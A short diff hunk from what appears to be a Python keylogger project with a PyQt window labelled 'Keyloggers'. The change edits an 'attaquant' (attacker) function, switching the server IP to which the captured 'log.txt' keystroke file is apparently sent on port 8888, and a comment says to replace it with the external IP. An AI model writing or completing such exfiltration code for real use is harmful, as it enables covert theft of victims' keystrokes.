@@ -67,7 +67,7 @@ class Ui_MainWindow(object):
         self.label.setText(_translate("MainWindow", "Keyloggers"))
 
 def attaquant():
-    host = "192.168.56.1" # adresse du serveur (remplacer par l'ip externe)
+    host = "192.168.56.7" # adresse du serveur (remplacer par l'ip externe)
     port = 8888 # port d'écoute du serveur
 
     file = "log.txt" # nom du fichier de logs 
